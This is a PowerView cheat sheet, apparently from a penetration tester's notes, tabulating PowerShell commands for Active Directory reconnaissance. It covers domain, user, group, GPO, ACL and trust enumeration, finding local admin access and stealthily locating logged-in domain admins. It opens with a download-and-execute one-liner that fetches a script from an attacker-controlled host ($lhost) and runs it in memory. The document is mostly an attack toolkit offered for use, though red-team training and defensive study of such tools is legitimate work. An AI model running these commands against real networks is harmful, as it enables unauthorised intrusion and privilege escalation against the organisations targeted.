# PowerView

<table><thead><tr><th width="286">Info</th><th width="683">Command</th></tr></thead><tbody><tr><td>Download &#x26; Import PowerView</td><td><code>iex(new-object net.webclient).downloadstring('http://$lhost/windows/privesc/PowerView.ps1');Import-Module .\PowerView.ps1</code></td></tr><tr><td>Get Domain</td><td><code>Get-NetDomain</code></td></tr><tr><td>Get object of another domain</td><td><code>Get-NetDomain -Domain domain.local</code></td></tr><tr><td>Get domain SID for the current domain</td><td><code>Get-DomainSID</code></td></tr><tr><td>Get domain policy for the current domain</td><td><code>(Get-DomainPolicy)."System Access"</code></td></tr><tr><td>Get kerberos policy for the current domain</td><td><code>(Get-DomainPolicy)."Kerberos Access"</code></td></tr><tr><td>Get domain policy for the another domain</td><td><code>(Get-DomainPolicy -domain domain.local)."System Access"</code></td></tr><tr><td>Get Domain controllers for the current domain</td><td><code>Get-NetDomainController</code></td></tr><tr><td>Get Domain controllers for another domain</td><td><code>Get-NetDomainController -Domain domain.local</code></td></tr><tr><td>Get a list of users in the current domain</td><td><code>Get-NetUser</code></td></tr><tr><td>Get list of properties for all users in the current domain</td><td><code>Get-UserProperty</code></td></tr><tr><td>Get User description</td><td><code>Find-UserField -SearchField Description -SearchTerm "built"</code></td></tr><tr><td>Get a list of computers in the current domain</td><td><code>Get-NetComputer</code></td></tr><tr><td>Get a list of computers in the current domain</td><td><code>Get-NetComputer -OperatingSystem "*Server 2016*"</code></td></tr><tr><td>Get a list of computers in the current domain</td><td><code>Get-NetComputer -Ping</code></td></tr><tr><td>Get a list of computers in the current domain</td><td><code>Get-NetComputer -FullData</code></td></tr><tr><td>Get all the groups in the current domain</td><td><code>Get-NetGroup</code></td></tr><tr><td>Get all the groups in the current domain</td><td><code>Get-NetGroup -Domain domain.local</code></td></tr><tr><td>Get all the groups in the current domain</td><td><code>Get-NetGroup -FullData</code></td></tr><tr><td>Get all the groups in the current domain</td><td><code>Get-NetGroup -FullData</code></td></tr><tr><td>Get all the members of the Domain Admins group</td><td><code>Get-NetGroupMember -GroupName "Domain Admins" -Recurse</code></td></tr><tr><td>Get the group memberships for a user</td><td><code>Get-NetGroup -UserName "user1"</code></td></tr><tr><td>List all the local groups on a machine (needs admin on non-dc machines)</td><td><code>Get-NetLocalGroup -ComputerName computer1.domain.local -ListGroups</code></td></tr><tr><td>Get members of all the local groups on a machine (needs admin on non-dc machines)</td><td><code>Get-NetLocalGroup -ComputerName computer1.domain.local -Recurse</code></td></tr><tr><td>Get actively logged on users on computer (needs local admin)</td><td><code>Get-NetLoggedOn -ComputerName computer1</code></td></tr><tr><td>Get locally logged on users on a computer (needs remote registry)</td><td><code>Get-LoggedonLocal -Computer computer1.domain.local</code></td></tr><tr><td>Get the last logged on user on a computter (needs admin &#x26; remote registry)</td><td><code>Get-LastLoggedOn -ComputerName computer1.domain.local</code></td></tr><tr><td>Find shares on hosts siin current domain</td><td><code>Invoke-ShareFinder -Verbose</code></td></tr><tr><td>Find sensitive files on computers in the domain</td><td><code>Invoke-FileFinder -Verbose</code></td></tr><tr><td>Get all fileservers of the domain</td><td><code>Get-NetFileServer</code></td></tr><tr><td>Get list of GPO in current domain</td><td><code>Get-NetGPO</code></td></tr><tr><td>Get list of GPO in current domain</td><td><code>Get-NetGPO -All</code></td></tr><tr><td>Get list of GPO in current domain</td><td><code>Get-GPO -All</code></td></tr><tr><td>Get GPOs which use restricted groups of groups.xml for interesting users</td><td><code>Get-NetGPOGroup</code></td></tr><tr><td>Find users which are in a local group of a machine using GPO</td><td><code>Find-GPOComputerAdmin -Computername computer1.domain.local</code></td></tr><tr><td>Get machines where the given user is member of a specific group</td><td><code>Find-GPOLocation -UserName user1 -Verbose</code></td></tr><tr><td>Get OUs in a domain</td><td><code>Get-NetOU -FullData</code></td></tr><tr><td>Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU</td><td><code>Get-NetGPO -GPOName "{AB306569-220D-43FF-B03B}"</code></td></tr><tr><td>Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU</td><td><code>Get-GPO -Guid AB306569-220D-43FF-B03B</code></td></tr><tr><td>Get the ACLs associated with the specific object</td><td><code>Get-ObjectACL -SamAccountName user1 -ResolveGUIDs</code></td></tr><tr><td>Get the ACLs associated with the specific prefix to be used for search</td><td><code>Get-ObjectAcl -ADSprefix 'CN=Administrators,CN=Users' -Verbose</code></td></tr><tr><td>Get the ACLs associated with the specified LDAP path to be used for search</td><td><code>Get-ObjectACL -ADSpath 'LDAP://CN=Domain AdminsCN=Users,DC=domain,DC=local' -ResolveGUIs -Verbose</code></td></tr><tr><td>Search for interesting ACEs</td><td><code>Invoke-ACLScanner -ResolveGUIDs</code></td></tr><tr><td>Get the ACLs associated with the specified path</td><td><code>Get-PathAcl -Path '\\domain.local\sysvol'</code></td></tr><tr><td>Get a list of all domain trusts for the current domain</td><td><code>Get-NetDomainTrust</code></td></tr><tr><td>Get a list of all domain trusts for the current domain</td><td><code>Get-NetDomainTrust -Domain domain.local</code></td></tr><tr><td>Get details about the current forest</td><td><code>Get-NetForest</code></td></tr><tr><td>Get details about the current forest</td><td><code>Get-NetForest -Forest domain.local</code></td></tr><tr><td>Get all domains in the current forest</td><td><code>Get-NetForestDomain</code></td></tr><tr><td>Get all domains in the current forest</td><td><code>Get-NetForestDomain -Forest domain.local</code></td></tr><tr><td>Get all global catalogs for the current forest</td><td><code>Get-NetForestCatalog</code></td></tr><tr><td>Get all global catalogs for the current forest</td><td><code>Get-NetForestCatalog -Forest domain.local</code></td></tr><tr><td>Map trusts of a forest</td><td><code>Get-NetForestTrust</code></td></tr><tr><td>Map trusts of a forest</td><td><code>Get-NetForestTrust -Forest domain.local</code></td></tr><tr><td>Find all machines on the current domain where the current user has local admin access</td><td><code>Find-LocalAdminAccess</code></td></tr><tr><td>Find local admins on all machines of tthe domain</td><td><code>Invoke-EnumerateLocalAdmin -Verbose</code></td></tr><tr><td>Find computers where a domain admin is logged in</td><td><code>Invoke-UserHunter -Stealth</code></td></tr></tbody></table>
